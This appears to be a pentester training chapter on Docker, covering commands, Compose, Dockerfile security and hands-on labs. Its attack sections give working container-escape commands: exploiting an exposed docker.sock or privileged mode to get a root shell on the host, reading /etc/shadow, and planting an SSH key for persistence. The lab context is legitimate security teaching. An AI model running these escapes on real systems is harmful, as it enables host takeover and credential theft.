# Supplementary: Docker for Cybersecurity Professionals

Docker is everywhere in modern infrastructure. As a pentester, you'll encounter Docker in targets you're attacking, tools you're running, and environments you're deploying. As a security professional, understanding Docker internals helps you find misconfigurations, escape containers, and secure deployments.

---

## What Docker Actually Is

Docker runs applications in **containers** — lightweight, isolated environments that share the host's kernel but have their own filesystem, processes, and network stack.

**How it differs from VMs:**

```
Virtual Machine:                     Docker Container:
┌─────────────────────┐              ┌─────────────────────┐
│     Application     │              │     Application     │
├─────────────────────┤              ├─────────────────────┤
│   Guest OS (full)   │              │  Libraries/Bins only│
├─────────────────────┤              ├─────────────────────┤
│    Hypervisor       │              │   Docker Engine     │
├─────────────────────┤              ├─────────────────────┤
│     Host OS         │              │     Host OS         │
└─────────────────────┘              └─────────────────────┘

VM: runs a FULL operating system        Container: shares the host kernel
    (2-20 GB, minutes to start)             (megabytes, seconds to start)
```

**Key point for security:** Containers are NOT VMs. They share the host kernel. A kernel exploit inside a container compromises the host. A container is an isolation mechanism, not a security boundary.

---

## Docker Architecture

```
docker CLI → Docker daemon (dockerd) → containerd → runc → container

docker CLI:    what you type commands into
dockerd:       the background service that manages everything
containerd:    manages container lifecycle
runc:          actually creates and runs containers using Linux namespaces and cgroups

Key files:
  /var/run/docker.sock    — the Unix socket docker CLI uses to talk to dockerd
  /var/lib/docker/        — where images, containers, and volumes are stored
  Dockerfile              — instructions to build an image
  docker-compose.yml      — defines multi-container applications
```

---

## Essential Docker Commands

### Images (templates for containers)

```bash
# List local images
docker images

# Pull an image from Docker Hub
docker pull ubuntu:22.04
docker pull nginx:latest
docker pull kalilinux/kali-rolling

# Build an image from a Dockerfile
docker build -t myimage:v1 .

# Remove an image
docker rmi image_name

# Search Docker Hub
docker search nginx

# View image history (layers — might reveal secrets)
docker history image_name
```

### Containers (running instances of images)

```bash
# Run a container interactively
docker run -it ubuntu:22.04 /bin/bash
# -i = interactive (keep STDIN open)
# -t = allocate a pseudo-TTY

# Run a container in the background (detached)
docker run -d --name webserver -p 8080:80 nginx
# -d = detached (background)
# --name = give it a name
# -p 8080:80 = map host port 8080 to container port 80

# List running containers
docker ps

# List ALL containers (including stopped)
docker ps -a

# Execute a command in a running container
docker exec -it container_name /bin/bash

# Stop a container
docker stop container_name

# Remove a container
docker rm container_name

# View container logs
docker logs container_name

# Inspect container details (network, mounts, env vars)
docker inspect container_name

# Copy files to/from a container
docker cp localfile.txt container_name:/path/in/container/
docker cp container_name:/path/in/container/file.txt ./
```

### Volumes (persistent storage)

```bash
# Create a volume
docker volume create mydata

# Run with a volume
docker run -v mydata:/app/data ubuntu

# Bind mount (map a host directory into the container)
docker run -v /host/path:/container/path ubuntu
# WARNING: this gives the container access to host files

# List volumes
docker volume ls

# Inspect a volume
docker volume inspect mydata
```

### Networking

```bash
# List networks
docker network ls

# Inspect a network
docker network inspect bridge

# Create a network
docker network create mynetwork

# Run a container on a specific network
docker run --network mynetwork ubuntu

# Connect a running container to a network
docker network connect mynetwork container_name
```

---

## Docker Compose

Docker Compose manages multi-container applications. A single `docker-compose.yml` defines all services, networks, and volumes.

### Example docker-compose.yml

```yaml
version: '3.8'

services:
  web:
    image: nginx:latest
    ports:
      - "8080:80"
    volumes:
      - ./website:/usr/share/nginx/html
    depends_on:
      - db
    networks:
      - frontend
      - backend

  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: SuperSecret123
      MYSQL_DATABASE: webapp
    volumes:
      - db_data:/var/lib/mysql
    networks:
      - backend

  adminer:
    image: adminer
    ports:
      - "8081:8080"
    networks:
      - backend

volumes:
  db_data:

networks:
  frontend:
  backend:
```

### Compose commands

```bash
# Start all services
docker compose up -d

# Stop all services
docker compose down

# View logs
docker compose logs -f

# Rebuild images
docker compose build

# Execute a command in a service
docker compose exec web bash

# Scale a service
docker compose up -d --scale web=3
```

---

## Dockerfiles — Building Custom Images

A Dockerfile is a recipe for building a Docker image. Each instruction creates a layer.

```dockerfile
# Start from a base image
FROM ubuntu:22.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive

# Install software
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    nginx \
    && rm -rf /var/lib/apt/lists/*

# Copy files from build context into the image
COPY ./app /opt/app
COPY ./config/nginx.conf /etc/nginx/nginx.conf

# Set the working directory
WORKDIR /opt/app

# Install Python dependencies
RUN pip3 install -r requirements.txt

# Expose a port (documentation — doesn't actually publish)
EXPOSE 80

# Define the command to run when the container starts
CMD ["python3", "app.py"]
```

### Security issues in Dockerfiles

```dockerfile
# BAD: Running as root (default)
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3
CMD ["python3", "app.py"]
# Container runs as root — if compromised, attacker is root in container

# GOOD: Create and use a non-root user
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y python3
RUN useradd -m appuser
USER appuser
CMD ["python3", "app.py"]

# BAD: Hardcoded secrets
ENV DB_PASSWORD=SuperSecret123
# Anyone who pulls this image can see the password:
# docker inspect or docker history reveals it

# GOOD: Use build args or runtime env vars
ARG DB_PASSWORD
ENV DB_PASSWORD=${DB_PASSWORD}
# Pass at build time: docker build --build-arg DB_PASSWORD=xxx .
# Or better: use Docker secrets or a vault at runtime

# BAD: Installing unnecessary tools
RUN apt-get install -y vim curl wget nmap netcat
# These help attackers after they compromise the container

# GOOD: Minimal image with only what's needed
FROM python:3.11-slim
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
CMD ["python3", "app.py"]
```

---

## Docker Security — Attacking and Defending

### Detecting if you're in a container

After getting a shell, check if you're inside Docker:

```bash
# Check for .dockerenv file (Docker creates this)
ls -la /.dockerenv
# If it exists → you're in Docker

# Check cgroup
cat /proc/1/cgroup | grep docker
# If "docker" appears → you're in Docker

# Check hostname (containers often have random 12-char hostnames)
hostname
# e.g., "a1b2c3d4e5f6"

# Check process tree (PID 1 is usually NOT init/systemd in containers)
cat /proc/1/cmdline
# In a container: might be "python3 app.py" or "nginx"
# On a real host: "init" or "systemd"

# Very few processes
ps aux
# Containers typically have very few processes compared to a full OS

# Missing tools
which ifconfig ip ss netstat
# Many containers have minimal tooling
```

### Container escape — Docker socket exposed

**The #1 Docker security vulnerability.** If `/var/run/docker.sock` is mounted inside the container, you can control the Docker daemon — which means you control the HOST.

```bash
# Check if the socket is available
ls -la /var/run/docker.sock

# If it exists, you can run Docker commands
# Install Docker CLI (or use curl against the socket directly)

# Method 1: Using Docker CLI (if installed in the container)
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
# You now have a root shell on the HOST

# Method 2: Using curl against the Docker API
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
# Lists all containers

# Create a container that mounts the host filesystem
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"Binds":["/:/host"],"Tty":true}' \
  http://localhost/containers/create
# Then start it and exec into it
```

### Container escape — privileged mode

```bash
# Check if privileged
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff → privileged (all capabilities)
# CapEff: 00000000a80425fb → not privileged (limited capabilities)

# If privileged, mount the host disk
fdisk -l                      # find the host disk (usually /dev/sda1)
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
ls /tmp/hostfs                # host filesystem!
cat /tmp/hostfs/etc/shadow    # host's password hashes
chroot /tmp/hostfs bash       # become root on the host

# Or add your SSH key for persistent access
echo "your_ssh_public_key" >> /tmp/hostfs/root/.ssh/authorized_keys
```

### Container escape — capabilities abuse

```bash
# Check your capabilities
capsh --print

# Dangerous capabilities:
# CAP_SYS_ADMIN    → mount filesystems, many other things
# CAP_SYS_PTRACE   → attach to any process (inject code into host processes)
# CAP_NET_ADMIN    → modify network configuration
# CAP_DAC_OVERRIDE → bypass file permission checks

# CAP_SYS_ADMIN escape (similar to privileged)
mount -t ext4 /dev/sda1 /tmp/hostfs
```

### Docker security best practices (defending)

```
1. Never run containers as root — use USER in Dockerfile
2. Never mount /var/run/docker.sock into containers
3. Never use --privileged unless absolutely necessary
4. Use read-only filesystems: docker run --read-only
5. Drop all capabilities and add only what's needed:
   docker run --cap-drop ALL --cap-add NET_BIND_SERVICE
6. Use Docker Content Trust (image signing)
7. Scan images for vulnerabilities: trivy, grype, snyk
8. Don't store secrets in Dockerfiles or environment variables
9. Use network segmentation between containers
10. Keep Docker and the host kernel updated
```

---

## Lab: Docker Hands-On

### Install Docker (on your Kali or Debian VM)

```bash
# Install Docker
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl enable --now docker

# Add your user to the docker group (so you don't need sudo)
sudo usermod -aG docker $USER
# Log out and back in for the group change to take effect

# Verify
docker --version
docker run hello-world
```

### Exercise 1: Run and interact with containers

```bash
# Run an Ubuntu container
docker run -it ubuntu:22.04 bash

# Inside the container
whoami           # root (by default — this is a security issue)
hostname         # random container ID
cat /etc/os-release
ls /
ps aux           # very few processes
ip a             # might not have ip — minimal image

# Try to access host resources
ls /host         # doesn't exist (no bind mounts)
ls /var/run/docker.sock   # doesn't exist (not mounted)

exit             # stop the container
```

### Exercise 2: Expose a web server

```bash
# Run Nginx
docker run -d --name myweb -p 8080:80 nginx

# Access it
curl http://localhost:8080

# Custom content
docker exec -it myweb bash
echo "<h1>Hacked by Docker</h1>" > /usr/share/nginx/html/index.html
exit
curl http://localhost:8080

# Cleanup
docker stop myweb && docker rm myweb
```

### Exercise 3: Build a custom image

```bash
mkdir ~/docker-lab && cd ~/docker-lab

# Create a simple Python web app
cat << 'EOF' > app.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
print("Server starting on port 8080...")
HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler).serve_forever()
EOF

echo "<h1>My Custom Docker App</h1>" > index.html

# Create the Dockerfile
cat << 'EOF' > Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY app.py .
COPY index.html .
EXPOSE 8080
CMD ["python3", "app.py"]
EOF

# Build and run
docker build -t myapp:v1 .
docker run -d --name myapp -p 8080:8080 myapp:v1
curl http://localhost:8080

# Check what's in the image
docker history myapp:v1

# Cleanup
docker stop myapp && docker rm myapp
```

### Exercise 4: Vulnerable Docker setup (practice container escape)

**WARNING: This intentionally creates a security vulnerability. Only do this in a lab VM.**

```bash
# Run a container with the Docker socket mounted (vulnerable!)
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:22.04 bash

# Inside the container — install Docker CLI
apt update && apt install -y docker.io curl

# You now have Docker access from INSIDE the container
docker ps                     # see all containers on the host
docker images                 # see all images on the host

# Escape to the host
docker run -v /:/host -it ubuntu:22.04 chroot /host bash
# whoami → root (on the HOST, not the container)
# cat /etc/hostname → the HOST's hostname
# cat /etc/shadow → the HOST's password hashes

# Exit both containers
exit
exit
```

### Exercise 5: Docker Compose multi-service app

```bash
mkdir ~/compose-lab && cd ~/compose-lab

cat << 'EOF' > docker-compose.yml
version: '3.8'
services:
  web:
    image: nginx
    ports:
      - "8080:80"
    volumes:
      - ./html:/usr/share/nginx/html
    networks:
      - frontend

  api:
    image: python:3.11-slim
    command: python3 -c "
      from http.server import HTTPServer, BaseHTTPRequestHandler
      import json
      class H(BaseHTTPRequestHandler):
          def do_GET(self):
              self.send_response(200)
              self.end_headers()
              self.wfile.write(json.dumps({'status':'ok','secret':'FLAG{docker_compose_lab}'}).encode())
      HTTPServer(('0.0.0.0',5000),H).serve_forever()
      "
    ports:
      - "5000:5000"
    networks:
      - frontend
      - backend

networks:
  frontend:
  backend:
EOF

mkdir html
echo "<h1>Docker Compose Lab</h1><p>API at port 5000</p>" > html/index.html

docker compose up -d
curl http://localhost:8080
curl http://localhost:5000

# See the network setup
docker network ls
docker network inspect compose-lab_frontend
docker network inspect compose-lab_backend

# Cleanup
docker compose down
```

### Exercise 6: Image security analysis

```bash
# Check what's in an image's layers
docker pull nginx
docker history nginx

# Look for secrets in layers
docker history nginx --no-trunc | grep -i "env\|arg\|password\|secret\|key"

# Install and run Trivy (vulnerability scanner)
sudo apt install trivy -y 2>/dev/null || docker run aquasec/trivy image nginx
# Shows CVEs in the image

# Inspect a container's environment
docker run -d --name test -e SECRET_KEY=MyS3cr3t nginx
docker inspect test | grep -A 5 "Env"
# The environment variable is visible to anyone who can inspect the container
docker stop test && docker rm test
```

---

## Docker in Pentesting — Using Docker as a Tool

### Running pentest tools in Docker

```bash
# Run Metasploit without installing it
docker run -it metasploitframework/metasploit-framework

# Run Nmap
docker run --rm instrumentisto/nmap -sV target_ip

# Run Gobuster
docker run --rm ghcr.io/oj/gobuster dir -u http://target -w /wordlists/common.txt

# Run BloodHound
docker run -p 7474:7474 -p 7687:7687 specterops/bloodhound
```

### Building a portable toolkit

```dockerfile
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y \
    nmap gobuster dirb nikto \
    python3 python3-pip \
    netcat-openbsd curl wget \
    smbclient enum4linux \
    john hashcat \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install impacket crackmapexec

WORKDIR /pentest
CMD ["/bin/bash"]
```

```bash
docker build -t pentest-toolkit .
docker run -it --network host pentest-toolkit
# You now have a full pentest toolkit in a container
```
